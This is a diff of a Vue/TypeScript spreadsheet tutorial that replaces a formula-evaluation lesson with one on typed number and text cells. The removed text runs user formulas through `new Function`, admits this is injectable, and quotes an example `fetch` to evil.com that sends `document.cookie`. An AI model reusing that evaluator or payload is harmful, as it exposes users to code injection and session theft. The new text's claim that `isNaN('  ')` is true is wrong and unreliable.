@@ -1,256 +1,486 @@
-# Computed Values
+# Vue Spreadsheet — Lesson 04 — Numbers and Text
 
 ## What you will build
 
-Formula evaluation. Type `=A1+B1` in a cell — it shows the sum of A1 and B1. Change A1 — the formula cell updates automatically without touching any other code.
+Type `12` into a cell and it becomes a real number. Type `hello` and it stays text. Nothing about how you interact with the grid changes — you still double-click, type, and press Enter exactly as lesson 03 built. What changes is what this project *understands* about what it holds: every cell's value is now honestly one of two distinct, mutually exclusive shapes, and the type system knows the difference.
 
-```
-┌──────┬──────┬──────────┐
-│   5  │  10  │ =A1+B1   │   ← you type this (raw value)
-├──────┼──────┼──────────┤
-│      │      │    15    │   ← the grid shows this (computed result)
-└──────┴──────┴──────────┘
-```
+This is the most important type this project builds. Everything from lesson 05 onward adds a new shape to it.
 
 ---
 
 ## What you need to know first
 
-In lesson 3 we made cells editable and established the data flow: `App` owns `gridData`, events flow upward from `Cell`, mutations happen only in `App`. This lesson adds a second layer: `displayData` — a computed view of `gridData` where formula cells show their results instead of their raw strings.
-
-We introduce `computed()` (derived reactive state) and composable functions (reusable logic packaged as a function).
+Lesson 03 left `rawValues: ref<Record<CellId, string>>({})` storing whatever text was typed, displayed as-is. The template shows `rawValues[cellId(...)], ?? ''` — the same raw string you typed, nothing more.
 
 ---
 
-## The lesson
+## Step 1 — A type that is honestly one of two things
 
-### The problem
+**The problem:** `rawValues` stores `"12"` and `"hello"` identically — both are strings. Nothing distinguishes a number someone wants to do arithmetic with from text that just happens to be sitting in a cell.
 
-When a user types `=A1+B1`, we need to:
-1. Detect it is a formula (starts with `=`)
-2. Parse the cell references (`A1`, `B1`) into grid coordinates
-3. Evaluate the arithmetic using the current cell values
-4. Re-evaluate automatically whenever A1 or B1 changes
+Replace `rawValues` in `<script setup>`:
 
-Step 4 is the key insight. Vue's `computed()` handles it — but only if the evaluation function reads reactive data.
+```typescript
+type Cell =
+  | { kind: 'number'; value: number }
+  | { kind: 'text';   value: string }
 
----
-
-### Step 1 — Cell address parsing
-
-**The problem:** Before we can evaluate `=A1+B1`, we must convert `A1` into `{ rowIndex: 0, colIndex: 0 }` — a position in the 2D array.
-
-```ts
-// src/composables/useSpreadsheet.ts
-function columnLetterToIndex(letter: string): number {
-  return letter.toUpperCase().charCodeAt(0) - 'A'.charCodeAt(0)
-}
-
-function rowNumberToIndex(numStr: string): number {
-  return parseInt(numStr, 10) - 1
-}
-
-function parseCellAddress(address: string): { rowIndex: number; colIndex: number } {
-  const match = address.match(/^([A-Z]+)(\d+)$/)
-  if (!match) throw new Error(`Invalid cell address: ${address}`)
-  return {
-    rowIndex: rowNumberToIndex(match[2]),
-    colIndex: columnLetterToIndex(match[1]),
-  }
-}
+const cells = ref<Record<CellId, Cell>>({})
 ```
 
-**Walkthrough:** `columnLetterToIndex('A')` calls `charCodeAt(0)` on `'A'`. `charCodeAt(index)` returns the Unicode numeric code of the character at that index — `'A'` is 65, `'B'` is 66, `'Z'` is 90. Subtracting `'A'.charCodeAt(0)` (which is 65) converts the letter to a 0-based index: `'A'` → 0, `'B'` → 1, `'C'` → 2. Spreadsheets use 1-based row numbers (`1` is the first row), so `rowNumberToIndex` subtracts 1.
+**Walkthrough — discriminated union:**
 
-`address.match(/^([A-Z]+)(\d+)$/)` applies a regular expression (regex) to the string.
+`Cell` is a union of two object types. Each object has a `kind` field set to one exact string — `'number'` on the first, `'text'` on the second. This tag field is what makes the union **discriminated**: given any real `Cell`, checking `kind` tells you exactly which shape you have, and therefore exactly what `value` contains.
 
-**What is a regular expression?** A pattern that matches strings. The regex `/^([A-Z]+)(\d+)$/` reads:
-- `^` — must start at the beginning of the string
-- `([A-Z]+)` — one or more uppercase letters; the parentheses create capture group 1
-- `(\d+)` — one or more digits (`\d` matches any digit 0-9); capture group 2
-- `$` — must end here (nothing after the digits)
-
-`address.match(regex)` returns an array if the pattern matches: `match[0]` is the full match, `match[1]` is capture group 1 (the letter), `match[2]` is capture group 2 (the number). Returns `null` if no match.
-
-**What is `parseInt(numStr, 10)`?** A built-in JavaScript function that parses a string as an integer. The second argument `10` specifies base-10 (decimal). Without the base, `parseInt` guesses the base from the string format — strings starting with `0x` are interpreted as hexadecimal. Always specify base-10 explicitly.
-
-**CS concept — parsing:** A parser converts a string in some language (here, spreadsheet address notation like `"A1"`) into a structured representation (here, `{ rowIndex, colIndex }`). This pattern — match with a regex, extract groups, convert to a data structure — is the foundation of all language processing: compilers, interpreters, configuration file readers.
-
-**SE principle — single responsibility:** `parseCellAddress` has one job: parse one cell address. It does not know about the grid's data, formulas, or evaluation. Changes to address format (e.g., supporting two-letter column names like `AA`) require changing only this function.
-
-**What breaks if `match` is null:** `parseCellAddress` throws `Error: Invalid cell address: X`. The `evaluateFormula` function (next step) must catch this — otherwise an invalid formula crashes the app.
-
----
-
-### Step 2 — Formula evaluation
-
-**The problem:** Given a formula string like `"=A1+B1"` and the full grid data, compute the result.
-
-```ts
-type CellValue = number | string
-
-function evaluateFormula(formula: string, rawData: CellValue[][]): number | string {
-  const expression = formula.slice(1) // remove the leading '='
-
-  const resolved = expression.replace(/[A-Z]+\d+/g, (address) => {
-    const { rowIndex, colIndex } = parseCellAddress(address)
-    const cellValue = rawData[rowIndex]?.[colIndex]
-
-    if (typeof cellValue === 'string' && cellValue.startsWith('=')) {
-      return String(evaluateFormula(cellValue, rawData)) // referenced cell is also a formula
-    }
-
-    return String(Number(cellValue) || 0)
-  })
-
-  try {
-    // eslint-disable-next-line no-new-func
-    const result = new Function(`return (${resolved})`)()
-    return typeof result === 'number' ? result : String(result)
-  } catch {
-    return '#ERROR'
-  }
-}
-```
-
-**Walkthrough:** Step 1: `formula.slice(1)` removes the leading `=`, leaving `"A1+B1"`. `String.prototype.slice(1)` returns a new string starting from index 1 (0-based), discarding the character at index 0.
-
-Step 2: `expression.replace(/[A-Z]+\d+/g, callback)` finds every cell address in the expression and replaces it. The regex `/[A-Z]+\d+/g` (no `^` or `$` anchors, plus the `g` flag) matches cell references anywhere in the string — the `g` flag means "global," replacing all matches instead of just the first. For `"A1+B1"`, the callback runs twice: once for `"A1"` (replaced with `"5"`) and once for `"B1"` (replaced with `"10"`). `resolved` becomes `"5+10"`.
-
-Step 3: `new Function('return (5+10)')()` creates a JavaScript function whose body is `return (5+10)`, then immediately calls it. The result is `15`.
-
-**What is `rawData[rowIndex]?.[colIndex]`?** Optional chaining (`?.`) was introduced in lesson 3. Here it guards against an out-of-bounds row: `rawData[rowIndex]` might be `undefined` if the formula references a row that does not exist. `?.` returns `undefined` instead of throwing `TypeError`.
-
-**What is `String(Number(cellValue) || 0)`?** Two conversion functions: `Number(cellValue)` converts a value to a number — `Number("5")` → `5`, `Number(null)` → `0`, `Number("hello")` → `NaN`. The `|| 0` replaces `NaN` and other falsy values with `0` (so an empty cell contributes 0 to arithmetic). `String(...)` converts the number back to a string so it can be substituted into the expression string.
-
-**Security — `new Function` and code injection:**
-
-`new Function(str)` executes JavaScript code from a string. This is dangerous. If a formula contains `=fetch('https://evil.com', {body: document.cookie})`, that expression will run.
-
-Our defence: the `replace` step substitutes only patterns matching `/[A-Z]+\d+/` (cell addresses). The remaining characters in the expression (`+`, `-`, `*`, `/`, `(`, `)`, digits) are arithmetic operators. A formula like `=fetch(1)` would not have `fetch` replaced (it does not match `[A-Z]+\d+`), so `resolved` would be `"fetch(1)"` — which `new Function` executes. This is a real vulnerability.
-
-In a production spreadsheet, you would parse the formula into an abstract syntax tree and evaluate the AST yourself — never passing the string to `eval` or `new Function`. We use `new Function` here because writing a full expression parser is beyond this lesson's scope. In this series, we are inside a sandboxed iframe, which limits the blast radius.
-
-The pattern to remember: **validate at the boundary, never trust user input**. When the input is code, the boundary must reject everything except a known-safe whitelist.
-
-**CS concept — recursive evaluation:** When a formula references a cell that is itself a formula (`=C1` where C1 contains `=A1+B1`), `evaluateFormula` calls itself. This is recursion — a function that solves the problem by solving a smaller instance of the same problem. The recursion terminates when a cell's value is not a formula. Circular dependencies (`=A1` ← `=B1` ← `=A1`) cause infinite recursion (stack overflow) — handled in lesson 10.
-
-**What breaks without the `try/catch`:** A formula like `=1/0` in JavaScript produces `Infinity` (not an error — JavaScript division by zero is defined). A formula like `=A1 +++ B1` (syntax error) causes `new Function` to throw `SyntaxError`. Without `try/catch`, one bad formula crashes `evaluateFormula` and prevents all cells from rendering.
-
----
-
-### Step 3 — The `useSpreadsheet` composable
-
-**The problem:** We need `displayData` — a version of `gridData` where formula cells show computed results — and we need it to update automatically whenever `gridData` changes.
-
-```ts
-// src/composables/useSpreadsheet.ts
-import { ref, computed } from 'vue'
-
-export function useSpreadsheet(initialData: CellValue[][]) {
-  const rawData = ref<CellValue[][]>(initialData)
-
-  const displayData = computed<(number | string)[][]>(() =>
-    rawData.value.map((row) =>
-      row.map((cell) => {
-        if (typeof cell === 'string' && cell.startsWith('=')) {
-          return evaluateFormula(cell, rawData.value)
-        }
-        return cell
-      })
-    )
-  )
-
-  function updateCell(rowIndex: number, colIndex: number, newValue: string) {
-    const parsed = parseFloat(newValue)
-    rawData.value[rowIndex][colIndex] = isNaN(parsed) ? newValue : parsed
-  }
-
-  return { rawData, displayData, updateCell }
-}
-```
-
-**What is a composable?** A function with a name starting with `use` that sets up and returns reactive state and logic. `useSpreadsheet` creates `rawData`, computes `displayData`, and defines `updateCell`. Calling `useSpreadsheet(initialData)` in `App.vue` gives you all three. Composables are the Vue 3 replacement for mixins: they package reusable logic without the magic property injection that made mixins hard to trace.
-
-**What is `computed()`?** `computed(callback)` creates a computed property — a reactive value derived from other reactive values. The `callback` runs when the computed is first accessed. Vue tracks which reactive values are read during the callback (`rawData.value` here). When any of those values change, Vue marks the computed stale and re-runs the callback the next time it is accessed.
-
-**What is `import { ref, computed } from 'vue'`?**
-
-- Both `ref` and `computed` are exports of the Vue framework's reactivity module.
-- `ref` creates a reactive container for a single value (first introduced in lesson 2).
-- `computed` creates a reactive derived value — one that automatically re-computes when its dependencies change.
-- We import both as named imports because we need both. We do not import the whole `vue` package — named imports make the dependency explicit and enable tree-shaking (the build tool removes exports we never import).
-
-**`computed()` vs a plain method:** A plain method `getDisplayData()` that maps `rawData.value` would work — once. But it would re-run every time the template accesses it, even if `rawData` had not changed. `computed()` caches its result. If `rawData` has not changed since the last access, Vue returns the cached result without re-running the callback. For a large spreadsheet, this is the difference between evaluating 100 formulas once per change vs. once per render frame.
-
-**CS concept — memoisation:** Caching the result of an expensive computation keyed on its inputs. When the inputs have not changed, return the cached result. `computed()` is Vue's built-in memoisation for reactive values. Excel uses the same principle: formula cells are re-evaluated only when one of their inputs changes, not on every screen refresh.
-
-**SE principle — separation of concerns:** `useSpreadsheet` owns all spreadsheet logic — data storage, formula evaluation, mutation. `Grid`, `Row`, and `Cell` know nothing about formulas. If we later replace `new Function` with a proper parser, we change only `useSpreadsheet.ts`.
-
-**What breaks if `displayData` is a method instead of `computed`:** Every template access to `displayData` triggers a full map over `rawData` and evaluates every formula. In a 100-cell spreadsheet with 20 formula cells, a single render calls `evaluateFormula` 20 times. `computed()` calls it 0 times if nothing changed, 20 times only when a cell is edited.
-
----
-
-### Step 4 — Connect to App.vue
-
-**The problem:** Replace `gridData` in `App.vue` with `useSpreadsheet` so the grid displays computed results instead of raw formula strings.
+To understand what this gains you, try this throwaway:
 
 ```vue
-<!-- src/App.vue -->
 <script setup lang="ts">
-import Grid from './components/Grid.vue'
-import { useSpreadsheet } from './composables/useSpreadsheet'
+type Cell =
+  | { kind: 'number'; value: number }
+  | { kind: 'text';   value: string }
 
-const { displayData, updateCell } = useSpreadsheet([
-  [5,  10, '=A1+B1'],
-  [20, 25, '=A2+B2'],
-  [35, 40, '=A3+B3'],
-])
+function processCell(cell: Cell): string {
+  switch (cell.kind) {
+    case 'number':
+      // Inside this case, TypeScript KNOWS cell.value is a number
+      return cell.value.toFixed(2)          // ok
+      // cell.value.toUpperCase()           // error: number has no toUpperCase
+
+    case 'text':
+      // Inside this case, TypeScript KNOWS cell.value is a string
+      return cell.value.toUpperCase()       // ok
+      // cell.value.toFixed(2)             // error: string has no toFixed
+  }
+}
+
+const examples: Cell[] = [
+  { kind: 'number', value: 3.14159 },
+  { kind: 'text',   value: 'hello' },
+]
 </script>
-
 <template>
-  <div class="spreadsheet">
-    <Grid :rows="displayData" @update-cell="updateCell" />
-  </div>
+  <ul>
+    <li v-for="(c, i) in examples" :key="i">{{ processCell(c) }}</li>
+  </ul>
 </template>
 ```
 
-**Walkthrough:** `useSpreadsheet` is called once with the initial data. It returns `displayData` (the computed view) and `updateCell` (the mutation function). `App.vue` passes `displayData` to `Grid` instead of the raw data. The `Grid` renders what is displayed; `updateCell` handles what changes.
+Uncomment the error lines one at a time. TypeScript catches them before ▶ Run. A method that only exists on `number` is caught in the `number` case; a method only on `string` is caught in the `text` case. The `switch` on `kind` teaches TypeScript which branch it is in, and TypeScript enforces the type from there. This is type narrowing inside a `switch` — the same mechanism as the `if (sel === null)` guards from lesson 02, at a larger scale.
 
-Try it: type `=A1+B1` in cell C1. The cell shows `15`. Change A1 to `100`. Cell C1 immediately shows `110` — without touching C1's formula or writing any update logic.
+**Why both variants share the field name `value`:**
 
-**What breaks without the `useSpreadsheet` wrapper:** If `displayData` is defined directly in `App.vue` as a computed referencing a local `rawData`, it works identically. The composable is an organisational choice — it prepares for lessons 5 through 12, which add formatting, selection, multiple sheets, and named ranges. Without the composable, all of that logic accumulates in `App.vue` until it becomes unmanageable.
+This is intentional. A `number` cell has `value: number`; a `text` cell has `value: string`. The same field name in both means any code that has already checked `kind` can read `.value` uniformly, regardless of which variant it turned out to be. This matters more when `Cell` grows a third shape in lesson 05.
 
-**CS concept — derived state:** `displayData` is derived from `rawData` — it is a pure function of the raw data. Given the same `rawData`, `displayData` always produces the same result. Derived state never needs to be manually synchronised — it cannot drift out of sync with its source. This is why React's `useMemo`, Svelte's reactive declarations (`$: `), and MobX's `computed` exist. They are all the same idea: compute the view from the data, automatically.
+**Why not just store `number | string`?**
+
+```typescript
+// Without the discriminated union:
+const cells: Record<CellId, number | string> = {}
+```
+
+This works, barely, but has no structural tag. To display the value, you would check `typeof cell === 'number'`. That is one check, in one function. Now add a formula variant in lesson 05: `number | string | ???`. The formula has no number or string representation until it is evaluated — you would need a different check, inconsistent with the `typeof` pattern. The `kind` tag keeps all variants consistent from the start.
 
 ---
 
-## Connect the pieces
+## Step 2 — Turn typed text into a real Cell
 
-The reactive chain: `rawData` (ref) → `displayData` (computed) → `Grid` → `Row` → `Cell` → visible value.
+**The problem:** Nothing yet decides whether a freshly typed string should become a number or text.
 
-When `updateCell` runs (from lesson 3's editing), it mutates `rawData`. Vue detects the mutation (via Proxy), marks `displayData` stale, and re-renders. Cells displaying formula results show their new values. No broadcast, no manual synchronisation.
+Add to `<script setup>`:
 
-**In production:** Google Sheets evaluates formulas exactly this way conceptually — a dependency graph where formula cells are derived from raw cells, re-evaluated when inputs change. Excel's calculation engine is famous for its performance optimisations around this same idea. The concept you learned here is the foundation of every reactive calculation system.
+```typescript
+function parseRawInput(rawInput: string): Cell {
+  const trimmed = rawInput.trim()
+  const numericValue = Number(trimmed)
+
+  if (trimmed !== '' && !Number.isNaN(numericValue)) {
+    return { kind: 'number', value: numericValue }
+  }
+
+  return { kind: 'text', value: rawInput }
+}
+```
+
+**Before reading the walkthrough, run these to see what `Number()` does:**
+
+```vue
+<script setup lang="ts">
+const tests = [
+  { input: '12',     result: Number('12')     },   // 12
+  { input: '3.14',   result: Number('3.14')   },   // 3.14
+  { input: '12abc',  result: Number('12abc')  },   // NaN
+  { input: '',       result: Number('')        },   // 0  ← surprise!
+  { input: ' 42 ',   result: Number(' 42 ')   },   // 42 (trims whitespace)
+  { input: 'hello',  result: Number('hello')  },   // NaN
+]
+</script>
+<template>
+  <table>
+    <tr v-for="t in tests" :key="t.input">
+      <td><code>Number("{{ t.input }}")</code></td>
+      <td>→ {{ t.result }}</td>
+      <td>isNaN: {{ Number.isNaN(t.result) }}</td>
+    </tr>
+  </table>
+</template>
+```
+
+Click ▶ Run. Notice the `''` row: `Number('')` is `0`, not `NaN`. That is why `parseRawInput` checks `trimmed !== ''` before the `Number.isNaN` check — clearing a cell's text should produce empty text, not the number zero.
+
+**Walkthrough — `Number()` vs `parseFloat()`:**
+
+`Number(string)` is strict: the entire string must be a valid number, or the result is `NaN`. `Number("12abc")` is `NaN`. `parseFloat("12abc")` is `12` — it stops at the first non-numeric character and returns what it parsed so far. For a spreadsheet cell, `"12abc"` is text someone typed, not the number 12 with garbage after it. `Number()` is the right choice.
+
+**Walkthrough — `Number.isNaN` vs global `isNaN`:**
+
+`Number.isNaN(value)` returns `true` only when `value` is the exact special `NaN` value. The older global `isNaN(value)` first converts its argument to a number before checking — `isNaN("hello")` is `true` (converts to NaN), but so is `isNaN(undefined)`, `isNaN({})`, and many others. `Number.isNaN` only answers the one question being asked: "is this value NaN?" Use `Number.isNaN` whenever checking for NaN.
+
+---
+
+## Step 3 — Display a cell, narrowing on its `kind`
+
+**The problem:** The template currently shows `rawValues[...] ?? ''`. It needs to show a `Cell`'s content — but the template does not know which `kind` it has.
+
+Add to `<script setup>`:
+
+```typescript
+function displayCell(cell: Cell | undefined): string {
+  if (!cell) return ''
+
+  switch (cell.kind) {
+    case 'number':
+      return cell.value.toString()
+    case 'text':
+      return cell.value
+  }
+}
+```
+
+Update `commitEdit` to use `parseRawInput` and `cells` instead of `rawValues`:
+
+```typescript
+function commitEdit(coordinate: Coordinate, value: string): void {
+  if (editingCoordinate.value === null) return
+  cells.value[cellId(coordinate)] = parseRawInput(value)
+  editingCoordinate.value = null
+}
+```
+
+Update the template: replace `rawValues[cellId({ col, row })] ?? ''` in both the input's `:value` and the display `{{ }}` with `displayCell(cells[cellId({ col, row })])`:
+
+```html
+<template v-if="isEditing(col, row)">
+  <input
+    class="cell-input"
+    :value="displayCell(cells[cellId({ col, row })])"
+    @keydown.enter.stop="commitEdit({ col, row }, ($event.target as HTMLInputElement).value)"
+    @blur="commitEdit({ col, row }, ($event.target as HTMLInputElement).value)"
+    :ref="(el) => { if (el) (el as HTMLInputElement).focus() }"
+  />
+</template>
+<template v-else>
+  {{ displayCell(cells[cellId({ col, row })]) }}
+</template>
+```
+
+**Note:** In Vue templates, `ref` unwraps automatically at the top level — write `cells` not `cells.value` in the template.
+
+Here is the complete file. Replace everything:
+
+```vue
+<script setup lang="ts">
+import { ref } from 'vue'
+
+const COLUMN_COUNT = 6
+const ROW_COUNT = 10
+
+interface Coordinate {
+  readonly col: number
+  readonly row: number
+}
+
+type CellId = string
+
+type Cell =
+  | { kind: 'number'; value: number }
+  | { kind: 'text';   value: string }
+
+function columnLetter(col: number): string {
+  return String.fromCharCode(65 + col)
+}
+
+function cellId(coordinate: Coordinate): CellId {
+  return `${columnLetter(coordinate.col)}${coordinate.row + 1}`
+}
+
+function parseRawInput(rawInput: string): Cell {
+  const trimmed = rawInput.trim()
+  const numericValue = Number(trimmed)
+  if (trimmed !== '' && !Number.isNaN(numericValue)) {
+    return { kind: 'number', value: numericValue }
+  }
+  return { kind: 'text', value: rawInput }
+}
+
+function displayCell(cell: Cell | undefined): string {
+  if (!cell) return ''
+  switch (cell.kind) {
+    case 'number': return cell.value.toString()
+    case 'text':   return cell.value
+  }
+}
+
+const columns = Array.from({ length: COLUMN_COUNT }, (_, col) => col)
+const rows    = Array.from({ length: ROW_COUNT },    (_, row) => row)
+
+const cells              = ref<Record<CellId, Cell>>({})
+const selectedCoordinate = ref<Coordinate | null>(null)
+const editingCoordinate  = ref<Coordinate | null>(null)
+
+function selectCell(coordinate: Coordinate): void {
+  selectedCoordinate.value = coordinate
+}
+
+function isCellSelected(col: number, row: number): boolean {
+  const sel = selectedCoordinate.value
+  if (sel === null) return false
+  return sel.col === col && sel.row === row
+}
+
+function startEditing(coordinate: Coordinate): void {
+  editingCoordinate.value = coordinate
+}
+
+function commitEdit(coordinate: Coordinate, value: string): void {
+  if (editingCoordinate.value === null) return
+  cells.value[cellId(coordinate)] = parseRawInput(value)
+  editingCoordinate.value = null
+}
+
+function isEditing(col: number, row: number): boolean {
+  const ed = editingCoordinate.value
+  if (ed === null) return false
+  return ed.col === col && ed.row === row
+}
+</script>
+
+<template>
+  <table class="spreadsheet">
+    <thead>
+      <tr>
+        <th></th>
+        <th v-for="col in columns" :key="col">{{ columnLetter(col) }}</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr v-for="row in rows" :key="row">
+        <th>{{ row + 1 }}</th>
+        <td
+          v-for="col in columns"
+          :key="col"
+          :id="'cell-' + cellId({ col, row })"
+          :class="['cell', { 'cell-selected': isCellSelected(col, row) }]"
+          @click="selectCell({ col, row })"
+          @dblclick="startEditing({ col, row })"
+        >
+          <template v-if="isEditing(col, row)">
+            <input
+              class="cell-input"
+              :value="displayCell(cells[cellId({ col, row })])"
+              @keydown.enter.stop="commitEdit({ col, row }, ($event.target as HTMLInputElement).value)"
+              @blur="commitEdit({ col, row }, ($event.target as HTMLInputElement).value)"
+              :ref="(el) => { if (el) (el as HTMLInputElement).focus() }"
+            />
+          </template>
+          <template v-else>
+            {{ displayCell(cells[cellId({ col, row })]) }}
+          </template>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</template>
+
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: system-ui, sans-serif; padding: 1rem; }
+.spreadsheet { border-collapse: collapse; }
+.spreadsheet th,
+.spreadsheet td {
+  border: 1px solid #cbd5e1;
+  min-width: 90px;
+  height: 28px;
+  text-align: left;
+  padding: 0 6px;
+  font-size: 0.875rem;
+  cursor: default;
+  position: relative;
+}
+.spreadsheet thead th,
+.spreadsheet tbody th {
+  background: #f1f5f9;
+  color: #475569;
+  font-weight: 600;
+  text-align: center;
+}
+.cell-selected {
+  outline: 2px solid #2563eb;
+  outline-offset: -2px;
+  background-color: #eff6ff;
+}
+.cell-input {
+  width: 100%;
+  height: 100%;
+  border: none;
+  outline: 2px solid #2563eb;
+  padding: 0 6px;
+  font: inherit;
+  background: white;
+  position: absolute;
+  top: 0; left: 0;
+}
+</style>
+```
+
+Click ▶ Run. Type `12` into a cell — it shows as `12`. Type `hello` into another — text. Type `3.14` — number. Type `12abc` — text (not a number, even though it starts with digits). Clear a cell you've already filled — shows empty, not `0`.
+
+---
+
+## Walkthrough — `Cell | undefined` in `displayCell`
+
+```typescript
+function displayCell(cell: Cell | undefined): string {
+  if (!cell) return ''
+  ...
+}
+```
+
+`cells.value[cellId(coordinate)]` — TypeScript says this returns `Cell`. But `Record<CellId, Cell>` is optimistic: it claims every key maps to a `Cell`, even keys no one has ever typed into. For unvisited cells, the runtime value is genuinely `undefined`.
+
+`displayCell` accepts `Cell | undefined` and guards at the top. The `if (!cell) return ''` covers both `undefined` (cell never typed) and falsy objects (not possible here, but defensive). After the guard, `cell` is narrowed to `Cell`.
+
+You can see this gap clearly by running:
+
+```vue
+<script setup lang="ts">
+type Cell = { kind: 'number'; value: number } | { kind: 'text'; value: string }
+import { ref } from 'vue'
+
+const cells = ref<Record<string, Cell>>({})
+
+// TypeScript says this is Cell — but at runtime it is undefined:
+const unvisited = cells.value['Z99']
+console.log('unvisited:', unvisited)   // undefined
+console.log('type says:', typeof unvisited)  // "undefined"
+</script>
+<template><p>Check console</p></template>
+```
+
+`Record`'s index type claims certainty TypeScript cannot actually deliver. `Cell | undefined` is the honest type; `displayCell`'s `if (!cell)` is the honest guard.
+
+---
+
+## Walkthrough — the `switch` on `cell.kind`
+
+```typescript
+switch (cell.kind) {
+  case 'number': return cell.value.toString()
+  case 'text':   return cell.value
+}
+```
+
+Inside `case 'number':`, TypeScript narrows `cell` to `{ kind: 'number'; value: number }`. Calling `.toString()` is safe. Calling `.toUpperCase()` would be a compile error — `number` has no `.toUpperCase()`.
+
+Inside `case 'text':`, TypeScript narrows `cell` to `{ kind: 'text'; value: string }`. Calling `.toUpperCase()` is safe. Calling `.toFixed(2)` would be a compile error — `string` has no `.toFixed()`.
+
+Try it:
+
+```vue
+<script setup lang="ts">
+type Cell =
+  | { kind: 'number'; value: number }
+  | { kind: 'text';   value: string }
+
+function displayCell(cell: Cell): string {
+  switch (cell.kind) {
+    case 'number':
+      // Try uncommenting these to see TypeScript errors:
+      // return cell.value.toUpperCase()   // error: number has no toUpperCase
+      return cell.value.toFixed(2)         // ok: number has toFixed
+    case 'text':
+      // return cell.value.toFixed(2)      // error: string has no toFixed
+      return cell.value.toUpperCase()      // ok: string has toUpperCase
+  }
+}
+
+const cells: Cell[] = [
+  { kind: 'number', value: 3.14159 },
+  { kind: 'text',   value: 'hello' },
+]
+</script>
+<template>
+  <ul>
+    <li v-for="(c, i) in cells" :key="i">{{ displayCell(c) }}</li>
+  </ul>
+</template>
+```
+
+The type system prevents calling a method that does not exist on the actual runtime type — caught before ▶ Run, not discovered as a runtime TypeError.
 
 ---
 
 ## What breaks without this
 
-**If `displayData` were a plain array recomputed in `updateCell`:** You must manually reassign `displayData` every time any cell changes. Miss one mutation path (a future feature that writes to cells without going through `updateCell`) and formulas go stale silently. With `computed`, Vue ensures `displayData` is always in sync with `rawData` — there is no way to miss an update.
+**Removing `trimmed !== ''` from `parseRawInput`:**
+
+Open a cell, type `"hello"`, press Enter. Now reopen it, delete everything, press Enter. `Number('')` is `0` — the cell becomes the number `0` rather than empty text. A subtle, invisible data corruption.
+
+**Using global `isNaN` instead of `Number.isNaN`:**
+
+```typescript
+if (trimmed !== '' && !isNaN(trimmed)) { ... }   // don't do this
+```
+
+`isNaN("  ")` is `true` (converts whitespace string to `NaN`). `Number.isNaN("  ")` is `false` (the string `"  "` is not literally `NaN`). With global `isNaN`, a cell containing only spaces would be stored as text. With `Number.isNaN`, it correctly parses as `Number("  ")` = `0` — but the `trimmed !== ''` check catches that before `Number.isNaN` is reached.
+
+**Calling `cell.value.toUpperCase()` in the `'number'` case:**
+
+TypeScript error immediately: *Property 'toUpperCase' does not exist on type 'number'*. This is the discriminated union protecting you — the type narrowing inside `case 'number':` made `cell.value` exactly `number`, and `number` does not have `toUpperCase`. Without the discriminated union (if `cell.value` were typed as `number | string`), this would compile and silently fail at runtime for number cells.
+
+---
+
+## Connect the pieces
+
+```
+App.vue
+  <script setup>
+    type Cell              — two variants: 'number' and 'text'
+    cells                  ref<Record<CellId, Cell>>({})
+    parseRawInput()        — pure; typed string → Cell; one write point
+    displayCell()          — pure; Cell | undefined → string;
+                             switch narrows per variant
+    commitEdit()           — calls parseRawInput; stores in cells
+  <template>
+    displayCell(cells[cellId({ col, row })])
+                           — same call in two places: input :value and
+                             the text display branch
+```
 
 ---
 
 ## Definition of done
 
-- [ ] Typing `=A1+B1` in an empty cell shows the sum of A1 and B1
-- [ ] Editing A1 causes the formula cell to update immediately
-- [ ] A formula referencing another formula cell (e.g., `=C1+1`) evaluates correctly
-- [ ] An invalid formula shows `#ERROR` without crashing
-- [ ] Typing a plain number or text still works as in lesson 3
-- [ ] **Git commit:**
+Click ▶ Run and verify:
 
-```
-git add src/
-git commit -m "Add formula evaluation with computed() — formula cells update automatically when inputs change"
-```
+- [ ] Typing a number stores it as `{ kind: 'number' }` — confirm by opening a typed cell and seeing the value ready for re-edit
+- [ ] Typing text stores it as `{ kind: 'text' }`
+- [ ] Typing `12abc` stores as text, not the number 12
+- [ ] Clearing a cell's text stores as text `''`, not the number `0`
+- [ ] You can trigger TypeScript errors by calling type-wrong methods inside the `switch` cases
+- [ ] You can explain the difference between `Number.isNaN` and global `isNaN` using concrete examples
+- [ ] You can explain why `displayCell` accepts `Cell | undefined` even though `Record<CellId, Cell>` claims to always return `Cell`
+
+---
+
+*Next: Lesson 05 — Formulas Appear. Typing `=anything` is recognised as a third kind of cell, stored distinctly, and displayed with its `=` restored. This is the lesson where `Cell` grows past two shapes — and where a new tool prevents `switch` statements from silently missing the new case forever.*
